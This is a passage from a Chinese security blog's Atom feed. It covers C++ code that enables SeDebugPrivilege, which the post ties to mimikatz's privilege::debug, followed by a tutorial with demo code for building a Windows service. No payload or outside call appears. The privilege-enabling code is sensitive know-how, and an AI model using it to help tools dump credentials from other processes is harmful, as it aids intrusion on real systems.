class="line">std::cout &lt;&lt; &quot;OpenProcessToken ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tp.PrivilegeCount &#x3D; 1;</span><br><span class="line">tp.Privileges[0].Attributes &#x3D; SE_PRIVILEGE_ENABLED;</span><br><span class="line">if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;Luid)) &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;LookupPrivilegeValue ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line">tp.Privileges[0].Luid &#x3D; Luid;</span><br><span class="line">if (!AdjustTokenPrivileges(Token, FALSE, &amp;tp, sizeof(tp), NULL, NULL) )&#123;</span><br><span class="line">std::cout &lt;&lt; &quot;AdjustTokenPrivileges ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line">if (GetLastError() &#x3D;&#x3D; ERROR_NOT_ALL_ASSIGNED) &#123;  &#x2F;&#x2F;ERROR_NOT_ALL_ASSIGNED的出现原因是，用户权限本身就没有sedebugprivilege</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">return true;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果觉得我的文章对您有用，请随意打赏。您的支持将</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;有很多工具需要启用SeDebugPrivilege才能正常使用，比如mimikatz就有个很经典的 privilege::debug.如果没有这个权限，administrator用openprocess可能都会报错，所以需要提升，管理员组拥有该权限但默认禁用，普通用户不拥有</summary>
      
    
    
    
    
    <category term="windows相关" scheme="http://const27.com/tags/windows%E7%9B%B8%E5%85%B3/"/>
    
  </entry>
  
  <entry>
    <title>windows创建一个服务</title>
    <link href="http://const27.com/2021/02/19/%E5%88%9B%E5%BB%BA%E6%9C%8D%E5%8A%A1/"/>
    <id>http://const27.com/2021/02/19/%E5%88%9B%E5%BB%BA%E6%9C%8D%E5%8A%A1/</id>
    <published>2021-02-19T09:22:00.334Z</published>
    <updated>2021-02-19T08:47:29.576Z</updated>
    
    <content type="html"><![CDATA[<h2 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h2><p>Windows服务，是指运行在windows nt操作系统后台的计算机程序.<br>Windows服务必须符合服务控制管理器的接口规则和协议（SCM)</p><h2 id="如何创建一个Windows服务"><a href="#如何创建一个Windows服务" class="headerlink" title="如何创建一个Windows服务"></a>如何创建一个Windows服务</h2><p>分为：<br>1.完成服务程序主函数（进程入口点（Main函数<br>2.完成服务程序内容主函数（ServiceMain<br>3.服务的注册器和卸载器</p><h3 id="服务程序主函数"><a href="#服务程序主函数" class="headerlink" title="服务程序主函数"></a>服务程序主函数</h3><p>这个阶段，主要干两件事：<br>1.设定好SERVICE_TABLE_ENTRY 结构变量，传入服务名和服务主函数<br>2.调用StartServiceCtrlDispatcher函数<br>以下是SERVICE_TABLE_ENTRY结构</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _SERVICE_TABLE_ENTRYW &#123;</span><br><span class="line">    LPWSTR                      lpServiceName;</span><br><span class="line">    LPSERVICE_MAIN_FUNCTIONW    lpServiceProc;</span><br><span class="line">&#125;SERVICE_TABLE_ENTRYW, *LPSERVICE_TABLE_ENTRYW;</span><br></pre></td></tr></table></figure><p>所以我们的服务程序的主函数只需要像这样写即可</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int main()&#123;</span><br><span class="line">SERVICE_TABLE_ENTRY Table[] &#x3D; &#123; &#123;L&quot;servicename&quot;,ServiceMain&#125;,&#123;NULL,NULL&#125; &#125;;</span><br><span class="line">StartServiceCtrlDispatcher(Table);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在SERVICE_TABLE_ENTRY里我们定义好了一个服务的名字以及其入口函数，然后使用StartServiceCtrlDispatcher去调用这个结构。<br>第一步就是这么简单，接下来让我们去实现服务的入口函数</p><h3 id="完成服务程序内容主函数"><a href="#完成服务程序内容主函数" class="headerlink" title="完成服务程序内容主函数"></a>完成服务程序内容主函数</h3><p>这一步主要要干这几个事情:<br>1.创建服务内容主函数<br>2在服务内容主函数里实现 <code>SERVICE_STATUS</code> 结构的填充，用于与SCM交流<br>3.实现服务句柄，并根据有服务句柄改变状态信息，从而实现SCM发来的控制请求<br>4.逻辑</p><h4 id="创建服务内容主函数"><a href="#创建服务内容主函数" class="headerlink" title="创建服务内容主函数"></a>创建服务内容主函数</h4><p>根据我们在 SERVICE_TABLE_ENTRY 结构中定义的服务入口函数，创建对应函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void WINAPI Servicename(DWORD argc, LPTSTR* argv)</span><br></pre></td></tr></table></figure><h4 id="实现-SERVICE-STATUS-结构"><a href="#实现-SERVICE-STATUS-结构" class="headerlink" title="实现 SERVICE_STATUS 结构"></a>实现 <code>SERVICE_STATUS</code> 结构</h4><p><code>SERVICE_STATUS</code> 结构定义如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _SERVICE_STATUS &#123;</span><br><span class="line">  DWORD dwServiceType;</span><br><span class="line">  DWORD dwCurrentState;</span><br><span class="line">  DWORD dwControlsAccepted;</span><br><span class="line">  DWORD dwWin32ExitCode;</span><br><span class="line">  DWORD dwServiceSpecificExitCode;</span><br><span class="line">  DWORD dwCheckPoint;</span><br><span class="line">  DWORD dwWaitHint;</span><br><span class="line">&#125; SERVICE_STATUS, *LPSERVICE_STATUS;</span><br></pre></td></tr></table></figure><p>每个项都对应了参数…太多了，建议去官方文档对照<br><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/ns-winsvc-service_status">https://docs.microsoft.com/en-us/windows/win32/api/winsvc/ns-winsvc-service_status</a></p><p>dwservicetype 指定了服务的类型<br>dwCurrentState 指定服务当前的状态（挂起，暂停，启动，停止…)<br>dwControlsAccepted 指定了服务句柄可以接受的参数<br>dwWin32ExitCode 服务用于报告错误的错误代码<br>dwServiceSpecificExitCode 服务特定的错误代码<br>dwCheckPoint 不太懂<br>dwWaitHint 挂起的 启动，停止，暂停或继续操作所需的估计时间，以毫秒为单位 。若指定时间已过去而dwCheckPoint未增加或者dwCurrentState尚未更改，则中止服务。</p><p>总而言之，就是创建一个结构用于收集服务的各个信息</p><h4 id="实现服务句柄-amp-改变状态信息"><a href="#实现服务句柄-amp-改变状态信息" class="headerlink" title="实现服务句柄&amp;改变状态信息"></a>实现服务句柄&amp;改变状态信息</h4><p>实现服务句柄主要是依靠RegisterServiceCtrlHandlerA函数实现的。<br>这个函数的作用是注册一个函数来处理指定服务控制请求。</p><p>这个函数的结构是这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SERVICE_STATUS_HANDLE RegisterServiceCtrlHandlerA(</span><br><span class="line">  LPCSTR             lpServiceName,</span><br><span class="line">  LPHANDLER_FUNCTION lpHandlerProc</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>lpservicename是指定服务名,lphandlerproc是被注册的函数。所以我们要使用这个函数来注册另一个函数，首先要完成被注册函数的内部逻辑。这里做个范例</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void WINAPI ctrl(DWORD Opcode)  &#x2F;&#x2F;定义式固定</span><br><span class="line">&#123;</span><br><span class="line">switch (Opcode)</span><br><span class="line">&#123;</span><br><span class="line">case SERVICE_CONTROL_PAUSE:</span><br><span class="line">m_ServiceStatus.dwCurrentState &#x3D; SERVICE_PAUSED;</span><br><span class="line">break;</span><br><span class="line">case SERVICE_CONTROL_CONTINUE:</span><br><span class="line">m_ServiceStatus.dwCurrentState &#x3D; SERVICE_RUNNING;</span><br><span class="line">break;</span><br><span class="line">case SERVICE_CONTROL_STOP:</span><br><span class="line">m_ServiceStatus.dwWin32ExitCode &#x3D; 0;</span><br><span class="line">m_ServiceStatus.dwCurrentState &#x3D; SERVICE_STOPPED;</span><br><span class="line">m_ServiceStatus.dwCheckPoint &#x3D; 0;</span><br><span class="line">m_ServiceStatus.dwWaitHint &#x3D; 0;</span><br><span class="line"></span><br><span class="line">SetServiceStatus(m_ServiceStatusHandle, &amp;m_ServiceStatus);</span><br><span class="line">bRunning &#x3D; false;</span><br><span class="line">break;</span><br><span class="line">case SERVICE_CONTROL_INTERROGATE:</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们发现这个函数会根据传入的值改变 <code>SERVICE_STATUS</code> 结构。<br>若把他注册，那么从服务管理控制器发来的控制指令会被当作参数传入该函数，然后该函数会修改 <code>SERVICE_STATUS</code> 。</p><p>那么改变状态信息的函数主要就是SetServiceStatus 了</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BOOL SetServiceStatus(</span><br><span class="line">  SERVICE_STATUS_HANDLE hServiceStatus,</span><br><span class="line">  LPSERVICE_STATUS      lpServiceStatus</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hservicestatus 指向服务句柄 lpservicestatus 指向 <code>SERVICE_STATUS</code> 结构。<br>完成这个函数后，服务就会向服务控制管理器发送自己最新的状态信息（即 <code>SERVICE_STATUS</code> 里定义的东西）。</p><h3 id="DEMO"><a href="#DEMO" class="headerlink" title="DEMO"></a>DEMO</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">SERVICE_STATUS m_ServiceStatus;</span><br><span class="line">SERVICE_STATUS_HANDLE m_ServiceStatusHandle;</span><br><span class="line">BOOL bRunning;</span><br><span class="line">int main() &#123;</span><br><span class="line">WCHAR Servicename[] &#x3D; L&quot;ServiceA&quot;;</span><br><span class="line">SERVICE_TABLE_ENTRY Table[] &#x3D; &#123; &#123;Servicename,ServiceMain&#125;,&#123;NULL,NULL&#125; &#125;;</span><br><span class="line">StartServiceCtrlDispatcher(Table);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void WINAPI ServiceMain(DWORD argc, LPTSTR* argv) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m_ServiceStatus.dwServiceType &#x3D; SERVICE_WIN32_OWN_PROCESS;</span><br><span class="line">m_ServiceStatus.dwCurrentState &#x3D; SERVICE_START_PENDING;</span><br><span class="line">m_ServiceStatus.dwControlsAccepted &#x3D; SERVICE_ACCEPT_STOP;</span><br><span class="line">m_ServiceStatus.dwWin32ExitCode &#x3D; 0;</span><br><span class="line">m_ServiceStatus.dwServiceSpecificExitCode &#x3D; 0;</span><br><span class="line">m_ServiceStatus.dwCheckPoint &#x3D; 0;</span><br><span class="line">m_ServiceStatus.dwWaitHint &#x3D; 0;</span><br><span class="line"></span><br><span class="line">m_ServiceStatusHandle &#x3D; RegisterServiceCtrlHandler(L&quot;ServiceA&quot;, HandlerFunc);</span><br><span class="line">m_ServiceStatus.dwCurrentState &#x3D; SERVICE_RUNNING;</span><br><span class="line">m_ServiceStatus.dwCheckPoint &#x3D; 0;</span><br><span class="line">m_ServiceStatus.dwWaitHint &#x3D; 0;</span><br><span class="line">SetServiceStatus(m_ServiceStatusHandle, &amp;m_ServiceStatus);</span><br><span class="line">bRunning &#x3D; true;</span><br><span class="line">while (bRunning) &#123;</span><br><span class="line">&#x2F;&#x2F;your code</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void WINAPI HandlerFunc(DWORD code) &#123;</span><br><span class="line">switch (code) &#123;</span><br><span class="line">case SERVICE_CONTROL_PAUSE:</span><br><span class="line">m_ServiceStatus.dwCurrentState &#x3D; SERVICE_PAUSED;</span><br><span class="line">break;</span><br><span class="line">case SERVICE_CONTROL_CONTINUE:</span><br><span class="line">m_ServiceStatus.dwCurrentState &#x3D; SERVICE_RUNNING;</span><br><span class="line">break;</span><br><span class="line">case SERVICE_CONTROL_STOP:</span><br><span class="line">m_ServiceStatus.dwWin32ExitCode &#x3D; 0;</span><br><span class="line">m_ServiceStatus.dwCurrentState &#x3D; SERVICE_STOPPED;</span><br><span class="line">m_ServiceStatus.dwCheckPoint &#x3D; 0;</span><br><span class="line">m_ServiceStatus.dwWaitHint &#x3D; 0;</span><br><span class="line"></span><br><span class="line">SetServiceStatus(m_ServiceStatusHandle, &amp;m_ServiceStatus);</span><br><span class="line">bRunning &#x3D; false;</span><br><span class="line">break;</span><br><span class="line">case SERVICE_CONTROL_INTERROGATE:</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;服务&quot;&gt;&lt;a href=&quot;#服务&quot; class=&quot;headerlink&quot; title=&quot;服务&quot;&gt;&lt;/a&gt;服务&lt;/h2&gt;&lt;p&gt;Windows服务，是指运行在windows nt操作系统后台的计算机程序.&lt;br&gt;Windows服务必须符合服务控制管理器的接口规则和协议</summary>
      
    
    
    
    
    <category term="windows相关" scheme="http://const27.com/tags/windows%E7%9B%B8%E5%85%B3/"/>
    
  </entry>
  
</feed>
